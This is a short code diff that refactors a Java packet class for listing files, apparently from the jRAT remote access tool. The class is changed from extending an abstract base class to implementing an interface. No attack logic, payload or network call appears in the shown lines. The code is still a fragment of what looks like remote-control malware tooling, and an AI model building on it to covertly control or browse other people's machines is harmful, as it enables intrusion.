@@ -1,12 +1,12 @@
 package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.incoming.AbstractIncomingPacket;
+import jrat.client.packets.incoming.IncomingPacket;
 
 import java.io.File;
 
 
-public class Packet15ListFiles extends AbstractIncomingPacket {
+public class Packet15ListFiles implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
